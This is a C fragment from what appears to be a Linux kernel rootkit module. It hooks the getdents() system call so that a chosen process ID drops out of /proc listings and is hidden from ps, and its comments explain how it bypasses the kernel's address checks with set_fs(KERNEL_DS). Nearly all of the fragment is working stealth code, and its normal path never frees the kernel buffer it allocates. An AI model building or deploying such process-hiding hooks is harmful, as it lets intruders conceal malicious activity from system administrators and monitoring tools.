/* ps calls getdents() on the /proc directory to get a list of all the processes that it will stat, open,
 * read, and then write to the terminal. So if we hook getdents() and make it skip over the pid we want 
 * to hide, then ps will never see it. */
asmlinkage long hook_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{   
    struct linux_dirent *dent;
    long ret, bpos, prev;
    char *buf = kmalloc(count, GFP_KERNEL);
    char *userp; 
    mm_segment_t old_fs;

    userp = (char *)dirp;

    /* System calls verify that any addresses passed to them are coming from userspace. By using 
     * get_fs() and set_fs(KERNEL_DS) we can alter the address limits for our module and pass the 
     * address of our linux_dirent struct to the system call without errors. And we reset it once
     * we're done. */
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = (og_getdents)(fd, (struct linux_dirent *)buf, count);
    set_fs(old_fs);


    for (bpos = prev = 0; bpos < ret; bpos += dent->d_reclen) {
	dent = (struct linux_dirent *) (buf + bpos);
	if (strcmp(dent->d_name, hide_pid) == 0) continue;
	if (copy_to_user(userp + prev, dent, dent->d_reclen)) {
	    ret = -EAGAIN;
	    kfree(buf);
	    break;
	}
	prev += dent->d_reclen;
    }

    if (ret > 0)
	ret = prev;

    return ret;
}

